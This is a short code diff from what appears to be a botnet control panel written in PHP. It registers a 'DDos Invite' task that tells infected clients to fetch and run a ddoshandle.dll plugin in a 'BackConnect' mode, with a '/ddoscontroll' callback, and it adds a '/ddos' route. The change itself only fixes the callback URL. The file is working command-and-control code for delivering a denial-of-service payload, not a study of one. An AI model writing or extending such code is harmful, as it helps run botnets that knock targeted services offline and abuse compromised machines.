@@ -14,7 +14,7 @@ register_navigation_tab("ddos",get_plugin_include_dir("about")."assets/nav/about
 $GLOBALS["task_configuration"]["ddos"] = array(
     "name" => "DDos Invite",
     "command" => "runplugin",
-    "value" => "http://".$_SERVER["HTTP_HOST"]."/versions/".$GLOBALS["loadedVersion"]."/plugins/ddos/dll/ddoshandle.dll;BackConnect;".$_SERVER["HTTP_HOST"]."/ddoscontroll",
+    "value" => "http://".$_SERVER["HTTP_HOST"]."/versions/".$GLOBALS["loadedVersion"]."/plugins/ddos/dll/ddoshandle.dll;BackConnect;http://".$_SERVER["HTTP_HOST"]."/ddoscontroll",
 );
 
 $router->all('/ddos', 'ddosController@ddoshub');
